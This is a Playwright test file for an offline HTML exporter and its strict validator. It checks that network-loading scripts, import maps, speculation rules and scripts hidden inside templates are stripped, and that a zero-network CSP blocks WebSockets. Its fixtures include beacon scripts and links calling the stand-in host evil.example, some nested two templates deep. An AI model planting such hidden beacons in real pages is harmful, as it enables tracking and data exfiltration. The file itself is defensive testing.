  '  <button id="parkedBtn" onclick="location.href=\'https://evil.example/parked-click\'">go</button>',
  // A second template INSIDE the first: the walk recurses, and the outermost template stays the
  // anchor, which is what the kept-as-inert count is judged against.
  '  <template id="nestedTemplate">',
  '    <script type="text/javascript" id="nestedBeacon">',
  "      window.__cmhNestedRan = true;",
  '      import("https://evil.example/nested.js").catch(function () {});',
  "    <\/script>",
  '    <script type="text/javascript" id="handledCommentIds">window.__cmhNestedReservedRan = true;</script>',
  "  </template>",
  "</template>",
  // The control: a template a document legitimately uses must come through undamaged.
  '<template id="benignTemplate">',
  '  <script type="text/javascript" id="benignParked">window.__cmhBenignParkedRan = true;<\/script>',
  '  <script type="importmap">{"imports": {"benign": "./benign.js"}}</script>',
  '  <img id="benignImg" alt="benign" src="data:image/gif;base64,R0lGODlhAQABAAAAACw=">',
  "  <style>.benign { color: #123456; }</style>",
  "</template>",
].join("\n");

test("CMH-OFFLINE-04: the offline strips inspect speculationrules, importmap, and template content", async ({ page, browser }) => {
  test.setTimeout(90000);
  const staged = stageContent(ACTIVE_DATA_TEMPLATE_CONTENT, { key: "cmh-offline-active-data", source: "offline-active-data.html" });
  const server = await startStaticServer(staged.dir);
  const outDir = makeTmpDir();
  let ctx2;
  try {
    await page.route(/^https?:\/\//, async (route) => {
      const url = route.request().url();
      if (/^https?:\/\/(localhost|127\.0\.0\.1)(:|\/)/.test(url)) return route.fallback();
      return route.abort();
    });
    await installDownloadTextCapture(page);
    await page.goto(server.url + "/test-doc.html");
    await ready(page);
    await openToolbarMenu(page);
    await Promise.all([
      page.waitForEvent("download"),
      page.locator("#btnExportOfflineTop").click(),
    ]);
    const exportedHtml = await capturedDownloadText(page);

    // Every speculation ruleset is gone, whether it named a network URL, a local one, nothing at
    // all, or an external file - the URL-less shape is the one no URL test could have caught.
    expect(exportedHtml, "a network speculation rule is removed").not.toContain("prerender-beacon");
    expect(exportedHtml, "a local speculation rule is removed too").not.toContain("local-next.html");
    expect(exportedHtml, "a document-source ruleset is removed").not.toContain("cmhDocSourceRuleset");
    expect(exportedHtml, "an external ruleset is removed").not.toContain("cmh-external-rules.json");
    // An import map goes for any non-local reference, in any spelling, and when it is external or
    // unparseable.
    expect(exportedHtml, "a network import map is removed").not.toContain("importmap-beacon.js");
    expect(exportedHtml, "a \\u-escaped target is removed").not.toContain("escaped-beacon.js");
    expect(exportedHtml, "a backslash-authority target is removed").not.toContain("backslash-beacon.js");
    expect(exportedHtml, "a blob: target is removed").not.toContain("blob-beacon");
    expect(exportedHtml, "a network scopes KEY is a reference too").not.toContain("scoped-beacon");
    expect(exportedHtml, "an unparseable map fails closed").not.toContain("oops-invalid-json");
    expect(exportedHtml, "an external import map is removed").not.toContain("cmh-external-map.json");
    expect(exportedHtml, "a template-parked network import map is removed").not.toContain("parked-map.js");
    // The local one is content and survives untouched, and so does the parameterized spelling,
    // which is inert data to a browser rather than an import map at all.
    expect(exportedHtml, "a local import map is preserved").toContain("./local-lib.js");
    expect(exportedHtml, "a parameterized type is inert data, not an import map").toContain("inert-data.js");
    // The template-parked script that beacons is stripped like any other runnable script.
    expect(exportedHtml, "a template-parked egress script is removed").not.toContain("evil.example/parked.js");
    expect(exportedHtml).not.toContain("parked-steal");
    expect(exportedHtml, "a template-parked network image is neutralized").not.toContain("parked-pixel.png");
    expect(exportedHtml, "template-parked CSS is scrubbed").not.toContain("parked-bg.png");
    expect(exportedHtml, "a template-parked event handler is removed").not.toContain("parked-click");
    expect(exportedHtml, "a script two templates deep is removed").not.toContain("evil.example/nested.js");
    // The benign template comes through whole.
    expect(exportedHtml, "a legitimate template survives").toContain("__cmhBenignParkedRan");
    expect(exportedHtml).toContain("./benign.js");
    expect(exportedHtml).toContain(".benign { color: #123456; }");
    // Both quiet outcomes are named to the author rather than left to be discovered. The removed
    // count is 4 rulesets (network, local, document-source, external) + 7 import maps (network,
    // escaped, backslash, blob, scopes key, invalid, external) + the template-parked import map +
    // the parked beacon + the nested beacon; the kept count is the two template-parked reserved-id
    // blocks (one at each depth).
    const toast = page.locator("#toast");
    await expect(toast).toContainText("14 scripts that load, prefetch, or navigate to the network were removed.");
    await expect(toast).toContainText("2 scripts carrying a reserved commentable-html data id were kept as inert data.");

    const exportedPath = path.join(outDir, "offline-active-data.html");
    fs.writeFileSync(exportedPath, exportedHtml);
    // The exporter and its own strict gate agree in both directions: nothing it left behind is a
    // shape the gate rejects, and the gate now sees template content and active data blocks too.
    execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", exportedPath], { cwd: SKILL, stdio: "pipe" });

    ctx2 = await browser.newContext();
    const page2 = await ctx2.newPage();
    const external = [];
    await page2.route(/^https?:\/\//, async (route) => {
      external.push(route.request().url());
      await route.abort();
    });
    await page2.goto(fileUrl(exportedPath));
    await ready(page2);
    // Adopting the fragments is what makes a parked script run, so drive exactly that: the
    // hostile template must have nothing left to run, and the benign one must still work.
    const adopted = await page2.evaluate(() => {
      const out = { reservedTypes: [], localMapParses: false };
      const readReserved = (root) => {
        root.querySelectorAll("script[id]").forEach((s) => {
          if (s.id === "reviewedSections" || s.id === "handledCommentIds") {
            out.reservedTypes.push(s.id + ":" + (s.getAttribute("type") || ""));
          }
        });
        root.querySelectorAll("template").forEach((t) => readReserved(t.content));
      };
      for (const id of ["hostileTemplate", "benignTemplate"]) {
        const t = document.getElementById(id);
        out[id] = !!t;
        if (t) {
          readReserved(t.content);
          document.body.appendChild(t.content.cloneNode(true));
        }
      }
      // Adopting the outer fragment only inserts the inner <template>; adopt that too, so a script
      // parked two levels deep would genuinely get its chance to run.
      document.querySelectorAll("body > template, #nestedTemplate").forEach((t) => {
        document.body.appendChild(t.content.cloneNode(true));
      });
      // The preserved import map is still a live, parseable import map element - not just bytes
      // that happen to survive. (A bare-specifier module cannot be driven end to end here: a
      // `file://` document cannot load a module at all, which is why this is the strongest
      // available check that the kept map is undamaged.)
      const kept = document.getElementById("localMap");
      out.localMapType = kept && kept.getAttribute("type");
      try { out.localMapParses = !!JSON.parse(kept.textContent).imports["local-lib"]; } catch (e) { /* stays false */ }
      out.parkedRan = !!window.__cmhParkedRan;
      out.parkedReservedRan = !!window.__cmhParkedReservedRan;
      out.nestedRan = !!window.__cmhNestedRan;
      out.nestedReservedRan = !!window.__cmhNestedReservedRan;
      out.benignRan = !!window.__cmhBenignParkedRan;
      return out;
    });
    expect(adopted.hostileTemplate, "the template element itself is preserved").toBe(true);
    expect(adopted.benignTemplate).toBe(true);
    expect(adopted.parkedRan, "the parked beacon must have nothing left to run").toBe(false);
    expect(adopted.nestedRan, "a beacon two templates deep must be gone too").toBe(false);
    expect(adopted.localMapType, "the kept import map is still an import map").toBe("importmap");
    expect(adopted.localMapParses, "the kept import map still parses to its local mapping").toBe(true);
    // A reserved-id block keeps its bytes and loses only the ability to run, inside a template -
    // at any depth - exactly as outside one.
    expect(adopted.reservedTypes.sort()).toEqual([
      "handledCommentIds:application/json", "reviewedSections:application/json"]);
    expect(adopted.parkedReservedRan).toBe(false);
    expect(adopted.nestedReservedRan).toBe(false);
    expect(adopted.benignRan, "a legitimate template script still runs when adopted").toBe(true);
    expect(page2.url()).toBe(fileUrl(exportedPath));
    expect(external).toEqual([]);
  } finally {
    if (ctx2) await ctx2.close();
    await server.close();
    fs.rmSync(staged.dir, { recursive: true, force: true });
    fs.rmSync(outDir, { recursive: true, force: true });
  }
});


// The SCHEME half of the network-URL predicates, measured rather than assumed. Both
// implementations (`_offlineIsNetworkUrl` in the exporter, `is_network_url` in the strict
// validator) recognize http/https authorities, scheme-relative ones and an explicit `file:` host,
// and deliberately read every OTHER authority-bearing scheme - `ftp:`, `ws:`, `wss:`,
// `filesystem:`, a custom scheme with no registered handler - as local. That boundary decides
// whether the exporter DELETES an author's reference and whether the gate rejects a file, so it is
// settled by what a browser actually does rather than by what the URL standard permits. What is
// driven is every AUTOMATIC SUBRESOURCE channel the strip covers; the references it also clears
// that are not automatic loads are listed in `SCHEME_PROBE_NON_LOAD_STRIP_TARGETS` below, each with
// its own covering test elsewhere on this row.
//
// The harness is asymmetric on purpose. The http CONTROL gets one raw TCP listener PER CHANNEL, so
// every channel is proven LIVE rather than assumed: an aggregate control is satisfied by the first
// `<img>` and lets a channel that is dead-by-construction contribute a free zero to every candidate
// forever (the first draft did exactly that - an at-rule import written after a qualified rule is
// dropped by the CSS parser, a `<source>` inside a media element that already carries `src` is
// ignored, and `background` is not a loading attribute on a `<div>`). Each CANDIDATE scheme then
// gets one listener for all channels together, because for a candidate the question is only "did
// ANYTHING connect", and a connection identifies the scheme that made it whatever protocol it would
// then have spoken. Because every URL here names the same loopback host, a proxy or sandbox policy
// applies to control and candidates alike - one that hid a candidate would fail the control first,
// loudly.
//
// What this probe deliberately does NOT measure, so the residual it backs is not read as wider than
// the evidence: the `file:` AUTHORITY arm (an off-machine SMB fetch that needs a real UNC host; the
// shared corpus in `tests/test_vendored_libs.py` and the URL-parser spec test pin that one); a
// scripted `WebSocket`, which no attribute can carry and which the next test measures against the
// export's own CSP; a scheme with a REGISTERED protocol handler, which turns a navigation into a
// fetch of the handler's own https template and cannot be registered from a `file:` document at all;
// DNS-only channels (`preconnect`, `dns-prefetch`) whose leak is a name resolution rather than a
// connection to this port - and which survive the strip in a candidate scheme, tracked as #1076;
// and any engine other than Chromium. `ws:`/`wss:`/`filesystem:` were not observed as
// subresource-fetchable in the Chromium under test, and nothing is claimed for other engines, but
// FTP removal in particular is an implementation choice, so that is the row to re-measure if the
// boundary is ever revisited. What travels WITH an already-exported file is not this probe but the
// export's own zero-network CSP, which refuses these subresources whatever a future engine decides.
const SCHEME_PROBE_CONTROL = "http";
// A second, aggregate control on the OTHER scheme both predicates recognize. It needs no
// per-channel breakdown - `https:` shares the http arm of the predicate and the same network stack
// - but a document that loaded neither would be a broken probe rather than evidence.
const SCHEME_PROBE_CONTROL_TLS = "https";
const SCHEME_PROBE_CANDIDATES = ["ftp", "ws", "wss", "filesystem", "custom", "gopher"];
// Every `rel` the exporter's own link pass treats as a LOAD (`_stripOfflineNetworkLoads`), not just
// the two obvious ones: a candidate scheme that fetched through only `modulepreload` or `prefetch`
// would otherwise leave this probe green.
const SCHEME_PROBE_LINK_RELS = [
  "stylesheet", "preload", "modulepreload", "preconnect", "dns-prefetch",
  "icon", "apple-touch-icon", "manifest", "prefetch", "prerender",
];
const SCHEME_PROBE_CHANNELS = [
  "img-src", "img-srcset", "script-src", "iframe-src", "video-src", "video-poster",
  "source-src", "source-srcset", "track-src", "audio-src", "object-data", "embed-src",
  "input-image", "td-background", "css-import", "css-url", "inline-style-url", "svg-image",
  "svg-use", "svg-script", "svg-feimage", "svg-fill", "svg-stroke", "svg-mask", "svg-clip",
  "svg-marker", ...SCHEME_PROBE_LINK_RELS.map((rel) => "link-" + rel),
];
// The channels the control was MEASURED to drive from a `file:` document. Each one is asserted
// live below, so a channel that silently stops loading is a failure rather than a free zero for
// every candidate. The SVG PAINT attributes are here even though the offline strip does not yet
// cover them (that gap is issue #1065, filed with #1063): they load over http, so they are exactly
// the kind of channel a scheme boundary has to be tested against, and pointing them at a candidate
// is free evidence. (`filter` is in #1065's list too but is NOT here: as a presentation attribute
// or a CSS value it did not resolve externally in the Chromium under test, so requiring it live
// would red the gate for a channel this engine does not drive.)
const SCHEME_PROBE_LIVE_CHANNELS = [
  "img-src", "img-srcset", "script-src", "iframe-src", "video-src", "video-poster",
  "source-src", "source-srcset", "audio-src", "object-data", "embed-src", "input-image",
  "td-background", "css-import", "css-url", "inline-style-url", "svg-image", "svg-script",
  "svg-feimage", "svg-fill", "svg-stroke", "svg-mask", "svg-clip", "svg-marker",
  "link-stylesheet", "link-preload", "link-modulepreload", "link-prefetch",
];
// ...and the ones the strip still covers but a headless page cannot be made to drive, each for a
// reason of its own rather than through a probe bug: a `<track>` is fetched only once its cue mode
// leaves `disabled`, an SVG `<use>` is same-origin only, `preconnect`/`dns-prefetch` resolve a name
// without connecting to this port (#1076), an icon or manifest is fetched by browser UI this page
// has none of, and `<link rel=prerender>` is a no-op superseded by speculation rules. They stay in
// the markup (a future engine may start driving them, and then the control assertion is what
// notices) but they are not claimed as measured.
const SCHEME_PROBE_UNOBSERVED_CHANNELS = [
  "track-src", "svg-use", "link-preconnect", "link-dns-prefetch",
  "link-icon", "link-apple-touch-icon", "link-manifest", "link-prerender",
];
// The strip covers four more references that this probe deliberately does NOT carry, because none
// of them is an automatic subresource LOAD and a TCP listener is therefore the wrong instrument:
// `a`/`area` `ping` (a beacon that needs a click), `form` `action` and `formaction` (a submission),
// `base` `href` (it rebases OTHER references rather than loading anything) and a `meta` refresh (a
// navigation). Each has its own covering test elsewhere on the CMH-OFFLINE-04 row, so what this
// probe claims is every automatic subresource channel, not literally everything the strip touches.
const SCHEME_PROBE_NON_LOAD_STRIP_TARGETS = [
  "a-ping", "form-action", "formaction", "base-href", "meta-refresh",
];

function schemeProbeUrl(name, authority) {
  if (name === "filesystem") return `filesystem:http://${authority}/temporary/p.png`;
  if (name === "custom") return `x-cmh-probe://${authority}/p.png`;
  return `${name}://${authority}/p.png`;
}

// `urlFor(channel)` lets the control hand every channel its own port while a candidate hands them
// all the same one. Every channel the markup asks for is RECORDED and an unknown one throws, so the
// coverage assertion below compares the declared lists to what the document really carries rather
// than to each other - otherwise a channel could be deleted from the markup while still parked in
// the unobserved list, and go unmeasured forever.
function schemeProbeMarkup(name, urlFor, seen) {
  const u = (channel) => {
    if (SCHEME_PROBE_CHANNELS.indexOf(channel) === -1) {
      throw new Error(`scheme probe markup uses an undeclared channel '${channel}'`);
    }
    if (seen) seen.add(channel);
    return urlFor(channel).replace(/&/g, "&amp;").replace(/"/g, "&quot;");
  };
  const links = SCHEME_PROBE_LINK_RELS
    .map((rel) => `<link rel="${rel}"${rel === "preload" ? ' as="image"' : ""} href="${u("link-" + rel)}">`)
    .join("\n");
  return `
<h2>${name}</h2>
<style>@import url("${u("css-import")}");</style>
<style>#probe-${name} { background-image: url("${u("css-url")}"); }</style>
${links}
<img src="${u("img-src")}" alt="">
<img srcset="${u("img-srcset")} 1x" alt="">
<script src="${u("script-src")}"></script>
<iframe src="${u("iframe-src")}"></iframe>
<video src="${u("video-src")}" poster="${u("video-poster")}"></video>
<video preload="auto"><source src="${u("source-src")}"><track src="${u("track-src")}" default></video>
<picture><source srcset="${u("source-srcset")}"><img alt=""></picture>
<audio src="${u("audio-src")}" preload="auto"></audio>
<object data="${u("object-data")}"></object>
<embed src="${u("embed-src")}">
<input type="image" src="${u("input-image")}">
<table><tr><td background="${u("td-background")}">legacy</td></tr></table>
<div id="probe-${name}">x</div>
<div id="probe-inline-${name}" style="background-image:url('${u("inline-style-url")}')">inline</div>
<svg width="40" height="40"><image href="${u("svg-image")}" width="8" height="8"></image><use href="${u("svg-use")}#g"></use><script href="${u("svg-script")}"></script>
<filter id="probe-fe-${name}"><feImage href="${u("svg-feimage")}"></feImage></filter>
<circle cx="10" cy="10" r="4" fill="url(${u("svg-fill")}#g)"></circle>
<circle cx="10" cy="22" r="4" stroke="url(${u("svg-stroke")}#s)"></circle>
<circle cx="22" cy="10" r="4" mask="url(${u("svg-mask")}#m)"></circle>
<circle cx="22" cy="22" r="4" clip-path="url(${u("svg-clip")}#c)"></circle>
<line x1="0" y1="0" x2="20" y2="20" stroke="black" marker-end="url(${u("svg-marker")}#mk)"></line>
</svg>
`;
}

test("CMH-OFFLINE-04: no authority-bearing scheme but http and https loads from a file: document, so the predicates' scheme boundary is evidence", async ({ page }) => {
  test.setTimeout(180000);
  const listeners = [];
  const connections = {};
  // One listener per (control, channel) pair and one per candidate scheme.
  const listenOn = async (key) => {
    connections[key] = 0;
    const server = net.createServer((socket) => {
      connections[key] += 1;
      socket.on("error", () => {});
      // Close quickly: nothing here needs to speak the protocol - the CONNECTION is the whole
      // measurement - and a held-open socket would stall the page's load event.
      setTimeout(() => socket.destroy(), 200);
    });
    server.on("error", () => {});
    await new Promise((resolve, reject) => {
      const onError = (err) => reject(err);
      server.once("error", onError);
      server.listen(0, "127.0.0.1", () => {
        server.removeListener("error", onError);
        resolve();
      });
    });
    listeners.push(server);
    return `127.0.0.1:${server.address().port}`;
  };
  const dir = makeTmpDir();
  try {
    const controlAuthority = {};
    for (const channel of SCHEME_PROBE_CHANNELS) {
      controlAuthority[channel] = await listenOn("control:" + channel);
    }
    const candidateUrl = {};
    const candidateAuthority = {};
    for (const name of [SCHEME_PROBE_CONTROL_TLS, ...SCHEME_PROBE_CANDIDATES]) {
      candidateAuthority[name] = await listenOn(name);
      candidateUrl[name] = schemeProbeUrl(name, candidateAuthority[name]);
    }
    const markupChannels = new Set();
    const blocks = [
      schemeProbeMarkup(SCHEME_PROBE_CONTROL,
                        (channel) => schemeProbeUrl(SCHEME_PROBE_CONTROL, controlAuthority[channel]),
                        markupChannels),
      ...[SCHEME_PROBE_CONTROL_TLS, ...SCHEME_PROBE_CANDIDATES].map(
        (name) => schemeProbeMarkup(name, () => candidateUrl[name])),
    ];
    // The declared channel list must match what the DOCUMENT actually carries, not just itself: a
    // channel dropped from the markup while still parked in the unobserved list would otherwise go
    // unmeasured forever, handing every candidate a free zero.
    expect([...markupChannels].sort(),
           "the probe markup and SCHEME_PROBE_CHANNELS have diverged")
      .toEqual([...SCHEME_PROBE_CHANNELS].sort());
    // ...and the live/unobserved split must partition exactly that list, with no overlap.
    expect([...SCHEME_PROBE_LIVE_CHANNELS, ...SCHEME_PROBE_UNOBSERVED_CHANNELS].sort(),
           "the live/unobserved split no longer partitions the probe's channels")
      .toEqual([...SCHEME_PROBE_CHANNELS].sort());
    expect(SCHEME_PROBE_LIVE_CHANNELS.filter((c) => SCHEME_PROBE_UNOBSERVED_CHANNELS.includes(c)),
           "a channel is in BOTH the live and the unobserved list").toEqual([]);
    // The `rel` set is a hand copy of the exporter's own; pin it to the source so a rel added
    // there cannot silently stop being probed.
    const stripSource = fs.readFileSync(path.join(DEV, "assets", "js", "68-export-offline.js"), "utf8");
    const relsMatch = stripSource.match(/const loads = \[([^\]]*)\];/);
    expect(relsMatch, "the exporter no longer declares its link `loads` rel list where this test "
                      + "reads it; re-point the extraction").toBeTruthy();
    expect(relsMatch[1].match(/"([^"]+)"/g).map((s) => s.slice(1, -1)).sort(),
           "SCHEME_PROBE_LINK_RELS has drifted from the exporter's link `loads` list")
      .toEqual([...SCHEME_PROBE_LINK_RELS].sort());
    const probe = path.join(dir, "scheme-probe.html");
    fs.writeFileSync(probe, `<!DOCTYPE html><html><head><meta charset="utf-8"><title>scheme probe</title></head>
<body>${blocks.join("\n")}</body></html>`);
    await page.goto(fileUrl(probe), { waitUntil: "domcontentloaded" });
    // Every block must actually be in the document: a truncated parse would otherwise read as a
    // set of inert schemes.
    for (const name of [SCHEME_PROBE_CONTROL, SCHEME_PROBE_CONTROL_TLS, ...SCHEME_PROBE_CANDIDATES]) {
      await expect(page.locator("#probe-" + name)).toHaveCount(1);
    }

    await expect
      .poll(() => connections[SCHEME_PROBE_CONTROL_TLS],
            { timeout: 60000,
              message: "the https control never connected, so this document cannot say anything "
                       + "about the candidate schemes" })
      .toBeGreaterThan(0);
    for (const channel of SCHEME_PROBE_LIVE_CHANNELS) {
      await expect
        .poll(() => connections["control:" + channel],
              { timeout: 60000,
                message: `the http control never loaded through '${channel}', so that channel `
                         + "cannot say anything about the candidate schemes. Fix the markup if it "
                         + "is a probe bug; if the engine genuinely stopped driving the channel, "
                         + "move it to SCHEME_PROBE_UNOBSERVED_CHANNELS and say why there." })
        .toBeGreaterThan(0);
    }
    // Give a candidate every chance to connect AFTER the whole document has settled, so a zero
    // below is a measurement rather than a race.
    await page.waitForLoadState("load").catch(() => {});
    await page.waitForTimeout(3000);
    const candidateVerdict = () => {
      for (const name of SCHEME_PROBE_CANDIDATES) {
        expect(connections[name],
               `${candidateUrl[name]} produced a connection from a file: document, so this scheme `
               + "IS a load channel and BOTH network-URL predicates (and the CSS ones) must be "
               + "widened to recognize it - together, or the exporter and the gate drift").toBe(0);
      }
    };
    candidateVerdict();
    // The control's budget is "however long its slowest channel took", so give the candidates a
    // second look at the very end - a late connection must fail rather than land after the read.
    await page.waitForTimeout(2000);
    candidateVerdict();
  } finally {
    for (const server of listeners) await new Promise((r) => server.close(r));
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test("CMH-OFFLINE-04: a reference in a scheme no Chromium fetches survives the strip and its own strict gate", async ({ page, browser }) => {
  test.setTimeout(120000);
  // The product half of the boundary above: because none of these schemes loads, neither side
  // reports one, so the exporter KEEPS the author's reference and `--strict` still certifies the
  // file as offline-clean. Widening one predicate without the other would break exactly one of
  // these two assertions, which is the CMH-OFFLINE-04 drift this pins.
  const CONTENT_WITH_INERT_SCHEMES = `
<h1>Inert scheme references</h1>
<p id="inert-note">A scheme a browser will not fetch is an author's reference, not egress.</p>
<img id="ftpRef" alt="ftp reference" src="ftp://inert.example/archive.png">
<img id="wsRef" alt="ws reference" src="ws://inert.example/socket.png">
<img id="wssRef" alt="wss reference" src="wss://inert.example/socket.png">
<img id="customRef" alt="custom reference" src="x-cmh-probe://inert.example/app.png">
<a id="mailtoRef" href="mailto:someone@inert.example">mail</a>
<style>.inert-bg { background-image: url("ftp://inert.example/bg.png"); }</style>
<img id="networkControl" alt="network control" src="https://evil.example/tracker.png">`;
  const staged = stageContent(CONTENT_WITH_INERT_SCHEMES, { key: "cmh-offline-inert-schemes", source: "offline-inert.html" });
  const server = await startStaticServer(staged.dir);
  const outDir = makeTmpDir();
  let ctx2;
  try {
    await page.route(/^https?:\/\//, async (route) => {
      const url = route.request().url();
      if (/^https?:\/\/(localhost|127\.0\.0\.1)(:|\/)/.test(url)) return route.fallback();
      return route.abort();
    });
    await installDownloadTextCapture(page);
    await page.goto(server.url + "/test-doc.html");
    await ready(page);
    await openToolbarMenu(page);
    await Promise.all([
      page.waitForEvent("download"),
      page.locator("#btnExportOfflineTop").click(),
    ]);
    const exportedHtml = await capturedDownloadText(page);

    // Kept, values intact: the strip has no business deleting a reference no browser fetches.
    expect(exportedHtml).toContain('src="ftp://inert.example/archive.png"');
    expect(exportedHtml).toContain('src="ws://inert.example/socket.png"');
    expect(exportedHtml).toContain('src="wss://inert.example/socket.png"');
    expect(exportedHtml).toContain('src="x-cmh-probe://inert.example/app.png"');
    expect(exportedHtml).toContain('href="mailto:someone@inert.example"');
    expect(exportedHtml).toContain('url("ftp://inert.example/bg.png")');
    // ...while the control in the same document, in a scheme that DOES load, is still stripped.
    expect(exportedHtml).not.toContain("evil.example");

    const exportedPath = path.join(outDir, "offline-inert.html");
    fs.writeFileSync(exportedPath, exportedHtml);
    // The gate agrees: it certifies the very file the exporter produced, inert schemes and all.
    execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", exportedPath], { cwd: SKILL, stdio: "pipe" });

    ctx2 = await browser.newContext();
    const page2 = await ctx2.newPage();
    const external = [];
    await page2.route(/^https?:\/\//, async (route) => {
      external.push(route.request().url());
      await route.abort();
    });
    await page2.goto(fileUrl(exportedPath));
    await ready(page2);
    await expect(page2.locator("#cmTypeBadge")).toHaveText("Offline");
    expect(external).toEqual([]);
  } finally {
    if (ctx2) await ctx2.close();
    await server.close();
    fs.rmSync(staged.dir, { recursive: true, force: true });
    fs.rmSync(outDir, { recursive: true, force: true });
  }
});
// The one channel the scheme boundary above defers to the CSP, pinned as a live measurement rather
// than as a string match on the policy text. A scripted `new WebSocket("ws://host/...")` really
// does reach the network from a `file:` document, and NO attribute predicate can see it - there is
// no URL-shaped attribute to read - so the "do not widen `ws:`/`wss:`" decision rests entirely on
// the export's `connect-src 'none'`. Asserting the directive SUBSTRING (which the CSP tests above
// already do) would still pass if a later edit made the policy carry a `connect-src` that no longer
// blocks, so this drives the real exported file, from a real page, against a raw TCP listener, and
// pins BOTH directions: blocked with the policy, connecting without it. The no-CSP control is what
// makes the zero meaningful - without it a broken harness would "prove" the channel closed.
test("CMH-OFFLINE-04: the export's connect-src none is what closes the scripted WebSocket channel no attribute predicate can see", async ({ page, browser }) => {
  test.setTimeout(120000);
  const staged = stageContent(
    '<h1>Scripted socket</h1>\n<p id="socket-note">A scripted WebSocket is not an attribute.</p>',
    { key: "cmh-offline-scripted-socket", source: "offline-socket.html" });
  const server = await startStaticServer(staged.dir);
  const outDir = makeTmpDir();
  // TWO listeners, one per phase. Sharing one counter would let a slow connection from the BLOCKED
  // phase land during the control phase, where the poll would read it as the control succeeding -
  // green for a file that actually leaks.
  const connections = { blocked: 0, control: 0 };
  const listeners = [];
  let ctx2;
  try {
    const listenOn = async (key) => {
      const server = net.createServer((socket) => {
        connections[key] += 1;
        socket.on("error", () => {});
        setTimeout(() => socket.destroy(), 200);
      });
      server.on("error", () => {});
      await new Promise((resolve, reject) => {
        const onError = (err) => reject(err);
        server.once("error", onError);
        server.listen(0, "127.0.0.1", () => {
          server.removeListener("error", onError);
          resolve();
        });
      });
      listeners.push(server);
      return `ws://127.0.0.1:${server.address().port}/beacon`;
    };
    const blockedUrl = await listenOn("blocked");
    const controlUrl = await listenOn("control");

    await page.route(/^https?:\/\//, async (route) => {
      const url = route.request().url();
      if (/^https?:\/\/(localhost|127\.0\.0\.1)(:|\/)/.test(url)) return route.fallback();
      return route.abort();
    });
    await installDownloadTextCapture(page);
    await page.goto(server.url + "/test-doc.html");
    await ready(page);
    await openToolbarMenu(page);
    await Promise.all([
      page.waitForEvent("download"),
      page.locator("#btnExportOfflineTop").click(),
    ]);
    const exportedHtml = await capturedDownloadText(page);
    expect(cspMetaContent(exportedHtml)).toContain("connect-src 'none'");
    const withCspPath = path.join(outDir, "offline-socket.html");
    fs.writeFileSync(withCspPath, exportedHtml);
    // The same bytes with the policy taken out, so the control differs from the subject in exactly
    // one thing: the CSP.
    const withoutCsp = exportedHtml.replace(
      /<meta\b[^>]*http-equiv=["']Content-Security-Policy["'][^>]*>/i, "");
    expect(withoutCsp).not.toBe(exportedHtml);
    const noCspPath = path.join(outDir, "offline-socket-no-csp.html");
    fs.writeFileSync(noCspPath, withoutCsp);

    const openSocket = (target, url) => target.evaluate((u) => new Promise((resolve) => {
      let ws;
      try {
        ws = new WebSocket(u);
      } catch (e) {
        resolve("throw");
        return;
      }
      ws.onopen = () => resolve("open");
      ws.onerror = () => resolve("error");
      setTimeout(() => resolve("timeout"), 5000);
    }), url);

    ctx2 = await browser.newContext();
    const page2 = await ctx2.newPage();
    const blockedMessages = [];
    page2.on("console", (m) => blockedMessages.push(m.text()));
    await page2.goto(fileUrl(withCspPath));
    await ready(page2);
    await openSocket(page2, blockedUrl);
    await page2.waitForTimeout(1000);
    expect(connections.blocked,
           "the exported file's zero-network CSP must stop a scripted WebSocket; a connection here "
           + "means the ws:/wss: schemes reach the network from an export and the decision not to "
           + "widen the network-URL predicates has lost its only backstop").toBe(0);
    // The refusal must name THIS socket and THIS directive: a bare "some CSP violation happened"
    // would also be satisfied by an unrelated report while the socket died of something else, and
    // the zero above would then be vacuous too.
    const blockedLog = blockedMessages.join("\n");
    expect(blockedLog, "the socket must be refused BY THE POLICY, not by an unrelated failure")
      .toMatch(/violates the following Content Security Policy directive/i);
    expect(blockedLog, "the CSP refusal must name the connect-src directive").toContain("connect-src");
    expect(blockedLog, "the CSP refusal must name the socket this test opened").toContain(blockedUrl);

    // The control: the identical document without the policy DOES connect, so the zero above is a
    // measurement of the CSP rather than of a harness that never worked. It uses its OWN listener,
    // so nothing it produces can be mistaken for the blocked phase or the reverse.
    await page2.goto(fileUrl(noCspPath));
    await ready(page2);
    await openSocket(page2, controlUrl);
    await expect
      .poll(() => connections.control,
            { timeout: 20000,
              message: "the no-CSP control never connected, so this test cannot prove the CSP is "
                       + "what blocked the socket" })
      .toBeGreaterThan(0);
    // Re-read the security assertion LAST, so a late connection from the blocked phase fails the
    // test rather than arriving after the only check of it.
    expect(connections.blocked,
           "a connection arrived on the CSP-protected socket after the fact").toBe(0);
  } finally {
    if (ctx2) await ctx2.close();
    for (const l of listeners) await new Promise((r) => l.close(r));
    await server.close();
    fs.rmSync(staged.dir, { recursive: true, force: true });
    fs.rmSync(outDir, { recursive: true, force: true });
  }
});